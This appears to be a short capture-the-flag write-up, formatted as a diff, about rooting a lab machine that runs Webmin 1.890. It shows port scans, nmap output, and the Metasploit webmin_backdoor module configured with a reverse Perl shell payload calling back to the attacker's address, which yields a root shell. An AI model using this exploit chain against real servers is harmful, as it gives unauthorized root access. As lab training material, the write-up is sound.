@@ -1,0 +1,95 @@
+started with rustscan
+
+rustscan -a 10.10.119.211
+
+got all these ports open
+
+Open 10.10.119.211:22
+Open 10.10.119.211:10000
+
+
+did nmap scan on port 10000
+
+PORT      STATE SERVICE REASON  VERSION
+10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 85326831317A9669D22D511CAB73B2CC
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+
+
+searched for this on exploit database got exploit
+
+https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_backdoor/
+https://www.exploit-db.com/exploits/47230
+
+
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+
+
+as this was present in the msf frame work i just opened it 
+
+msfconsole
+
+after that i searched for webmin
+
+search webmin
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+
+
+as given the version webmin_1.890
+
+is vuln to password_xhange.cgi 
+so selected number 5
+
+use 5 and setted all the options
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                         ort][...]
+   RHOSTS     ip	       yes       The target host(s), range CIDR identifier, or hosts
+                                          file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. T
+                                         his must be an address on the local machine or 0.0.
+                                         0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is random
+                                         ly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.17.12.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+typed the command expoit
+
+and i got the shell
+and it was the root user so no need to do anything just
+typed shell to get a good interactive shell and got all the flags.
